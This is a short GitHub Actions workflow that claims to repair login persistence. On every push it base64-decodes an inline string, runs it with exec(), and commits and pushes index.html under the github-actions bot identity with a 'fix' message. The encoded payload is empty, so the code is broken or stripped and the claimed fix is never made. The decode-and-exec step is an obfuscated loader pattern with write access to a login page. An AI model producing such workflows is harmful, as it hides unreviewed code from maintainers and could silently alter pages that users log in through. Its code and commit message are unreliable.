name: Repair login persistence
on: push
jobs:
  repair:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
      - name: Patch
        run: |
          python - <<'PY'
          from pathlib import Path
          import base64
          code=base64.b64decode('').decode()
          exec(compile(code,'patch.py','exec'))
          PY
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git add index.html
          git commit -m 'fix: employee and supervisor login home' || true
          git push